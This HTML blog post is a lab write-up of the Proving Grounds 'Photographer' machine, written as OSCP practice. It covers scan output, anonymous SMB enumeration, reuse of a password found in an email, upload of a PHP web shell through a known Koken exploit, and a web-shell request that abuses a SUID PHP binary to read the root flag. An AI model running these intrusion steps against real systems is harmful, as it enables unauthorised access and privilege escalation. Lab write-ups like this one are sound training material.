<!DOCTYPE html>
<link rel="stylesheet" href="/assets/css/syntax.css" type="text/css" />
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Proving Grounds - Photographer</title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Proving Grounds - Photographer" />
<meta name="author" content="Dimitar Ganev" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I’ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I’ve tried. The machine is fairly straightforward and it’s labeled easy." />
<meta property="og:description" content="I’ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I’ve tried. The machine is fairly straightforward and it’s labeled easy." />
<link rel="canonical" href="http://localhost:4000/ctf-writeup/2023/04/15/pg-photographer.html" />
<meta property="og:url" content="http://localhost:4000/ctf-writeup/2023/04/15/pg-photographer.html" />
<meta property="og:site_name" content="archive://syl" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-15T00:00:00+03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Proving Grounds - Photographer" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"Dimitar Ganev"},"@type":"BlogPosting","description":"I’ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I’ve tried. The machine is fairly straightforward and it’s labeled easy.","headline":"Proving Grounds - Photographer","dateModified":"2023-04-15T00:00:00+03:00","datePublished":"2023-04-15T00:00:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf-writeup/2023/04/15/pg-photographer.html"},"url":"http://localhost:4000/ctf-writeup/2023/04/15/pg-photographer.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="archive://syl" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
</head><body a="auto">
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">..</a><article>
  <p class="post-meta">
    <time datetime="2023-04-15 00:00:00 +0300">2023-04-15</time>
  </p>
  
  <h1>Proving Grounds - Photographer</h1>

  <p>I’ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I’ve tried. The machine is fairly straightforward and it’s labeled easy.</p>

<p>I’ve started with a simple <code class="language-plaintext highlighter-rouge">nmap</code> scan, which hinted that this Linux machine is part of an Active Directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 414daa1886948e88a74c6b426076f14f <span class="o">(</span>RSA<span class="o">)</span>
|   256 4da3d07a8f64ef82452d011318b7e013 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a017a4fcf9585bf31a14f1587ab94e2 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
8000/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: daisa ahomi
|_http-generator: Koken 0.22.24
Service Info: Host: PHOTOGRAPHER<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>On the port <code class="language-plaintext highlighter-rouge">80</code> we have a simple web page which is more or less just a placeholder of a template, but on the <code class="language-plaintext highlighter-rouge">8000</code> we have a functional website build with <code class="language-plaintext highlighter-rouge">Koken</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Versions for :80
http://192.168.160.76:80/ 
[200 OK] Apache[2.4.18], 
Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], 
IP[192.168.160.76], 
JQuery, Script, 
Title[Photographer by v1n1v131r4]

# Versions for :8000
http://192.168.160.76:8000/
[200 OK] Apache[2.4.18], 
Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],
IP[192.168.160.76], JQuery[1.12.4], 
Meta-Author[daisa ahomi], 
MetaGenerator[Koken 0.22.24],
Script, Title[daisa ahomi], 
X-UA-Compatible[IE=edge]
</code></pre></div></div>

<p>I immediately searched for exploits for <code class="language-plaintext highlighter-rouge">Koken 0.22.24</code>, and found this one: https://www.exploit-db.com/exploits/48706</p>

<p>This is <code class="language-plaintext highlighter-rouge">authenticated</code> exploit, so it hinted that I must look further to get some credentials.</p>

<p>Upon scanning the Active Directory (<code class="language-plaintext highlighter-rouge">139,445</code>) I found public shares, one of which was non-default <code class="language-plaintext highlighter-rouge">sambashare</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> 192.168.160.76           
Sharename       Type      Comment
<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
print<span class="nv">$ </span>         Disk      Printer Drivers
sambashare      Disk      Samba on Ubuntu
IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>photographer server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
</code></pre></div></div>

<p>I explored it and found 2 files, one was an email in a <code class="language-plaintext highlighter-rouge">txt</code> format and the other one was zipped WordPress site, I’ve scanned the WordPress source code with <code class="language-plaintext highlighter-rouge">gf</code> (https://github.com/tomnomnom/gf) but found nothing. The mail thought had an interesting text inside that hinted two users and suggestion for a password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>agi@photographer.com - Agi Clarence
daisa@photographer.com - Daisa Ahomi
</code></pre></div></div>

<p>I found the password for the user <code class="language-plaintext highlighter-rouge">daisa@photographer.com</code> in the content of the mail. (It is very simple!)</p>

<p>After that, I logged into the <code class="language-plaintext highlighter-rouge">Koken's</code> Admin Panel and uploaded a simple PHP shell using the previously mentioned exploit. I could read the <code class="language-plaintext highlighter-rouge">user/local.txt</code> file that yielded the user own flag.</p>

<p>The root was pretty straightforward, upon scanning for <code class="language-plaintext highlighter-rouge">SUID</code> binaries, I found that <code class="language-plaintext highlighter-rouge">/usr/bin/php7.2</code> was such, and a simple request with the previous active shell yielded me the root flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /storage/originals/4f/38/image.php?cmd<span class="o">=</span>/usr/bin/php7.2+-r+<span class="s1">'readfile("/root/proof.txt")%3b'</span> HTTP/1.1
Host: 192.168.210.76:8000
Upgrade-Insecure-Requests: 1
User-Agent: ...
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,image/apng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
Cookie: <span class="nv">koken_session_ci</span><span class="o">=</span>...
Connection: close
</code></pre></div></div>

</article>
      </div>
    </main>
  </body>
</html>